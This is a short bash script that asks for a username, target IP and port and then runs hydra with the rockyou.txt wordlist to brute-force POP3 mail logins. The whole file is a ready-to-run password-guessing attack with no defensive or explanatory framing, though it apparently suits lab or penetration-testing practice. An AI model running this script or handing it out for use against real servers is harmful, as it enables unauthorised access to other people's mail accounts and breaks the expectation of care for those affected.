#!/bin/bash

echo "Enter username: "

read USERNAME

echo "Enter target IP: "

read TARGET

echo "Enter port: "

read PORT 

PASSWD="/usr/share/wordlists/rockyou.txt"

hydra -l "$USERNAME" -P "$PASSWD" -s "$PORT" "$TARGET" pop3 -t 4 -V

